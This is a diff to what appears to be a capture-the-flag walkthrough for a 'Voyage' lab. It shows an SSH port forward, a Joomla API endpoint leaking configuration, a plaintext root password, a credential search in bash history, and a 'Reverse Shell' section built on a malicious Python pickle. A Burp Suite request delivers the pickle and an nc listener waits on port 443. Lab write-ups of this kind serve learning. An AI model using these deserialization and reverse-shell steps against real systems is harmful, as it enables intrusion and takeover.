@@ -488,6 +488,7 @@ PORT     STATE SERVICE VERSION
 <img width="1172" height="817" alt="image" src="https://github.com/user-attachments/assets/fd038757-492a-4811-8b89-4e9237e92a2a" />
 
 <br>
+<br>
 
 ```bash
 :~/Voyage# ssh root@xx.xxx.xx.xx -p 2222 -L 5000:192.168.100.12:5000
@@ -539,7 +540,7 @@ tcp            ESTAB           0                0                          192.1
 <img width="1124" height="597" alt="image" src="https://github.com/user-attachments/assets/2375179a-9059-4716-8ca2-641d34c9d7ce" />
 
 <br>
-<h2>xx.xxx.xx.xx/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20</h2>
+<p>xx.xxx.xx.xx/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20</p>
 
 <p>
 
@@ -548,7 +549,7 @@ tcp            ESTAB           0                0                          192.1
 - fromname: Tourism<br>
 - /usr/sbin/sendmail</p>
 
-<h2>xx.xxx.xx.xx/api/index.php/v1/config/application?public=true</h2>
+<p>xx.xxx.xx.xx/api/index.php/v1/config/application?public=true</p>
 
 - root : RootPassword@1234 (for SSH)</p>
 
@@ -727,6 +728,17 @@ Searching possible passwords inside /root/.bash_history (limit 100)
 /etc/ssl/openssl.cnf:challengePassword_min
 ```
 
+<p>
+
+- logged in as admin in :5000<br>
+- intercepted in Burp Suite<br>
+- sent the Request to Repeater<br>
+- customized the Request using the output of script.py<br>
+- customized the Request adding some metadata fetching headers<br>
+- set up a listener<br>
+- Send</p>
+
+<br>
 <h2>Reverse Shell</h2>
 
 ```bash
@@ -742,7 +754,6 @@ malicious_pickle = pickle.dumps(Malicious())
 
 print("Malicious pickle in hex:", malicious_pickle.hex())
 ```
-
 
 ```bash
 :~/Voyage# python3 script.py
@@ -775,6 +786,8 @@ Sec-Fetcg-Site: none
 Sect-Fetch-User: ?1
 Priority: u=0; i
 ```
+
+<h2>Shell as User</h2>
 
 ```bash
 :~/Voyage# nc -nlvp 443
